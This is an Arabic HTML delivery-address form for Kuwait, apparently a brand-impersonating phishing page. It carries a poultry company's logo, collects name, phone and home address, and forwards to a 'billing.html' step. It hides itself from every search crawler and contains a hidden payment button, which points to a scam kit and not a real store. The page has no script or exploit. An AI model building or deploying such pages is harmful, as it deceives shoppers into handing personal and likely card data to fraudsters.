<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
  <meta name="bingbot" content="noindex, nofollow" />
  <meta name="yandex" content="none" />
  <title>بيانات عنوان التوصيل - الكويت</title>
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@300;400;500;600;700&display=swap");

    :root {
      --bg: #fafafa;
      --surface: #ffffff;
      --ink: #202635;
      --line: #ececf2;
      --brand: #087443;
      --brand-dark: #055b35;
      --shadow: 0 18px 40px rgba(45, 49, 66, 0.08);
    }

    * {
      box-sizing: border-box;
      font-family: "Readex Pro", sans-serif;
    }

    body {
      margin: 0;
      background:
        radial-gradient(circle at top right, rgba(8, 116, 67, 0.14), transparent 24%),
        linear-gradient(180deg, #f2faf3 0%, #e5f2e8 100%);
      color: var(--ink);
    }

    .shell {
      min-height: 100vh;
      width: min(100%, 560px);
      margin: 0 auto;
      background: var(--surface);
      border-radius: 30px 30px 0 0;
      padding: 18px 16px 30px;
      box-shadow: 0 24px 60px rgba(42, 48, 63, 0.10);
      border: 1px solid rgba(223, 228, 236, 0.95);
    }

    .shell::before {
      content: "";
      display: block;
      height: 8px;
      margin: -18px -16px 10px;
      background: linear-gradient(90deg, #055b35 0%, #087443 52%, #37b978 100%);
    }

    .search {
      margin: 26px 0 20px;
      height: 56px;
      border-radius: 999px;
      background: linear-gradient(180deg, #f4f6fa 0%, #eef1f6 100%);
      display: flex;
      align-items: center;
      gap: 14px;
      padding: 0 18px;
      color: #9ba1ad;
      font-size: clamp(16px, 3vw, 22px);
      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.85);
      display: none;
    }

    .search-icon {
      font-size: 26px;
      line-height: 1;
    }

    .toolbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 4px;
      padding: 6px 8px;
    }

    .toolbar-left,
    .toolbar-right {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .tool-circle {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      border: 1px solid var(--line);
      background: #fff;
      display: grid;
      place-items: center;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.04);
      font-size: 22px;
      position: relative;
    }

    .badge {
      position: absolute;
      top: -3px;
      right: -4px;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: #c81919;
      color: #fff;
      display: grid;
      place-items: center;
      font-size: 10px;
      border: 2px solid #fff;
    }

    .avatar,
    .hamburger {
      font-size: 36px;
      line-height: 1;
    }

    .form-card {
      padding: 4px 8px 18px;
    }

    .toolbar,
    .form-card {
      position: relative;
      z-index: 1;
    }

    .field {
      background: #fff;
      border: 1px solid #ececf2;
      border-radius: 22px;
      padding: 10px 12px 12px;
      box-shadow: 0 12px 28px rgba(33, 38, 55, 0.06);
    }

    .field {
      margin: 11px 0;
    }

    .label {
      display: block;
      margin-bottom: 5px;
      font-size: clamp(15px, 2.4vw, 18px);
      font-weight: 600;
    }

    .required {
      color: #ff3347;
      margin-right: 6px;
    }

    .control,
    .select-wrap select {
      width: 100%;
      height: 50px;
      border-radius: 15px;
      border: 1px solid #dfe4eb;
      background: linear-gradient(180deg, #fff 0%, #fbfbfd 100%);
      padding: 0 15px;
      font-size: clamp(14px, 2.3vw, 16px);
      color: var(--ink);
      outline: none;
      box-shadow: 0 2px 12px rgba(33, 38, 55, 0.03) inset;
    }

    .control::placeholder,
    .select-wrap select {
      color: #b8bcc6;
    }

    .control:focus,
    .select-wrap select:focus {
      border-color: #5bcf98;
      box-shadow: 0 0 0 3px rgba(8, 116, 67, 0.16);
    }

    .select-wrap {
      position: relative;
    }

    .select-wrap::after {
      content: "⌄";
      position: absolute;
      left: 18px;
      top: 50%;
      transform: translateY(-50%);
      color: #9fa4b1;
      font-size: 20px;
      pointer-events: none;
    }

    .select-wrap select {
      appearance: none;
    }

    .actions {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr;
      gap: 10px;
      margin-top: 16px;
    }

    .btn {
      height: 52px;
      border: 0;
      border-radius: 15px;
      font-size: clamp(14px, 2.2vw, 16px);
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 12px 26px rgba(0, 0, 0, 0.12);
    }

    .btn-apple {
      background: linear-gradient(180deg, #16181d 0%, #050505 100%);
      color: #fff;
    }

    .btn-primary,
    .btn-cart {
      background: linear-gradient(180deg, #0a9b58 0%, #087443 100%);
      color: #fff;
    }

    .btn-primary {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    @media (max-width: 640px) {
      .shell {
        padding: 12px 10px 20px;
      }

      .field {
        padding: 9px 10px 11px;
        border-radius: 16px;
      }

      .search {
        height: 52px;
        margin-top: 24px;
        font-size: 16px;
      }

      .tool-circle {
        width: 40px;
        height: 40px;
        font-size: 18px;
      }

      .avatar,
      .hamburger {
        font-size: 30px;
      }

      .control,
      .select-wrap select,
      .btn {
        height: 48px;
      }

      .actions {
        gap: 10px;
      }
    }
  </style>
</head>
<body>
  <main class="shell">
    <div class="search">
      <span class="search-icon">⌕</span>
      <span>ادخل كلمة البحث</span>
    </div>

    <section class="toolbar">
      <div class="toolbar-right">
        <div class="hamburger">☰</div>
      </div>
      <div class="toolbar-left">
        <div class="avatar">👤</div>
        <div class="tool-circle">
          🛒
          <span class="badge">•</span>
        </div>
        <img src="assets/photos/home-logo.png" alt="دواجن الوطنية" style="width: 92px; height: 42px; object-fit: contain;" />
      </div>
    </section>

    <form class="form-card" action="billing.html">
      <div class="field">
        <label class="label" for="full_name">الاسم الكامل</label>
        <input class="control" id="full_name" name="full_name" type="text" placeholder="ادخل الاسم الأول واسم العائلة" autocomplete="name" required />
      </div>

      <div class="field">
        <label class="label" for="phone">رقم الجوال</label>
        <input class="control" id="phone" name="phone" type="tel" placeholder="5xxxxxxxx" autocomplete="tel" required />
      </div>

      <div class="field">
        <label class="label" for="country">اختر الدولة</label>
        <div class="select-wrap">
          <select id="country" name="country">
            <option selected>الكويت</option>
          </select>
        </div>
      </div>

      <div class="field">
        <label class="label" for="city">اختر المحافظة</label>
        <div class="select-wrap">
          <select id="city" name="city">
            <option selected>اختر المحافظة</option>
            <option>العاصمة</option>
            <option>حولي</option>
            <option>الفروانية</option>
            <option>الأحمدي</option>
            <option>الجهراء</option>
            <option>مبارك الكبير</option>
          </select>
        </div>
      </div>

      <div class="field">
        <label class="label" for="district">الحي</label>
        <input class="control" id="district" name="district" type="text" placeholder="المنطقة" />
      </div>

      <div class="field">
        <label class="label" for="street">الشارع</label>
        <input class="control" id="street" name="street" type="text" placeholder="ادخل اسم الشارع" />
      </div>

      <div class="field">
        <label class="label" for="house">وصف البيت</label>
        <input class="control" id="house" name="house" type="text" placeholder="اكتب وصفًا للبيت" />
      </div>

      <div class="actions">
        <button class="btn btn-apple" type="submit" style="display: none;"></button>
        <button class="btn btn-primary" type="submit">اشتري الآن 🛍</button>
        <button class="btn btn-cart" type="submit">🛒</button>
      </div>
    </form>
  </main>
</body>
</html>
